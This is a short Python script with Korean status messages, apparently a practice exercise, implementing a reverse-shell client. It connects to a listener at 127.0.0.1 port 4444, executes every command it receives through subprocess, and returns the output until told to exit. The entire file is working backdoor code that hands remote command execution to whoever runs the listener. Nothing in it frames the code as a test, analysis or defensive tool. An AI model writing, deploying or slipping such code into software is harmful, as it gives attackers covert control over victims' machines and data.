import socket, subprocess, threading

def connect(h, p):
    cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cSocket.connect((h, p))

    msg = cSocket.getsockname()[0] + '과의 연결이 되었습니다.'
    data = msg.encode()
    cSocket.send(data)
    try:
        while True:
            data = cSocket.recv(1024)
            msg = data.decode()

            print('Received : ', msg)
            if msg == 'exit':
                break
            data = subprocess.run(msg.split(' '), stdout=subprocess.PIPE, encoding='utf-8')
            
            msg = data.stdout
            # print(msg)
            cSocket.send(msg.encode())

    except socket.error as erm: 
        print('클라이언트가 종료되었습니다.', erm)
    finally:
        cSocket.close()

if __name__ == '__main__':
    h = '127.0.0.1'
    p = 4444
    try:
        th = threading.Thread(target=connect, args=(h, p))
        th.start()
    except threading.ThreadError as ter:
        print('스레드가 종료되었습니다. ', ter)    
    
